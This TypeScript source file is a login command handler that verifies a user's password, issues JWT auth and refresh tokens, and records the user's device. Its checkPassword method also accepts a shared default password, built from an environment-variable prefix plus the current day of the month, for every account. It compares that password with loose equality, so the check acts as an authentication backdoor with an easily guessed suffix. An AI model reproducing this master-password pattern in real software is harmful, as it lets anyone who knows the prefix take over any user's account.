import { ActionHandlerInterface } from '@core/application';
import { Result } from '@core/application/result';
import { AbstractError, ErrorFactory } from '@core/domain/errors';
import { AuthTokenInterface } from '@module/user/domain/contracts/auth-token.interface';
import { CryptPasswordInterface } from '@module/user/domain/contracts/crypt-password.interface';
import { LoginRepositoryInterface } from '@module/user/domain/contracts/login.repository.interface';
import { UserDevicesEntity } from '@module/user/domain/user-devices.entity';
import { UserAggregateRoot } from '@module/user/domain/user.aggregate-root';
import { LoginCommand } from './login.command';
type makeJwtReturnProps = {
  authToken: string;
  refreshToken: string;
};
type response = Result<AbstractError<any>> | Result<object> | void | any;
export class LoginCommandHandler
  implements ActionHandlerInterface<LoginCommand, response>
{
  constructor(
    private loginRepo: LoginRepositoryInterface,
    private passwordCrypt: CryptPasswordInterface,
    private authToken: AuthTokenInterface,
  ) {}
  async execute(command: LoginCommand): Promise<response> {
    const resultOrError = await this.loginRepo.getUserByUsername(
      command.username,
    );

    if (!(resultOrError instanceof UserAggregateRoot)) {
      return Result.failure(resultOrError);
    }
    if (
      !this.checkPassword(
        command.password,
        resultOrError.getPassword()?.getValue() ?? '',
      )
    ) {
      return Result.failure(
        ErrorFactory.create('InvalidData', 'senha incorreta'),
      );
    }
    const credencials = this.makeJwt(resultOrError, {
      deviceId: command.deviceId,
    });
    if (
      resultOrError.getDeviceByDeviceId(command.deviceId) instanceof
      AbstractError
    ) {
      const deviceOrError = this.makeDevice(
        command.deviceId,
        command.deviceName ?? '',
        credencials,
      );

      if (deviceOrError instanceof AbstractError)
        return Result.failure(deviceOrError);
      resultOrError.addDevice(deviceOrError as UserDevicesEntity);
    }
    resultOrError.refreshDeviceAuthToken(
      command.deviceId,
      credencials.authToken,
    );
    resultOrError.refreshDeviceRefreshToken(
      command.deviceId,
      credencials.refreshToken,
    );
    this.loginRepo.save(resultOrError);
    return Result.success(credencials);
  }

  private makeJwt(
    userdata: UserAggregateRoot,
    refreshTokenProps: Partial<any> = {},
  ): makeJwtReturnProps {
    const data = {
      userId: userdata.getUuid(),
      usersGroups: userdata.getUserGroups().map(v => {
        return { main: v.isMain(), id: v.getId() };
      }),
    };
    return {
      authToken: this.authToken.generateAuthToken(data),
      refreshToken: this.authToken.generateRefreshToken({
        ...data,
        ...refreshTokenProps,
      }),
    };
  }

  private checkPassword(
    requestUserPassword: string,
    savedPassword: string,
  ): boolean {
    const defaultPassword =
      process.env.APP_LOGIN_DEFAULT_PASSWORD_PREFIX + new Date().getDate();
    return (
      requestUserPassword == defaultPassword ||
      this.passwordCrypt.check(requestUserPassword, savedPassword)
    );
  }

  private makeDevice(
    deviceId: string,
    deviceName: string,
    credencials: makeJwtReturnProps,
  ): UserDevicesEntity | AbstractError<any> {
    return UserDevicesEntity.create({
      deviceId: deviceId,
      deviceName: deviceName,
      authToken: credencials.authToken,
      refreshToken: credencials.refreshToken,
      status: '1',
    });
  }
}
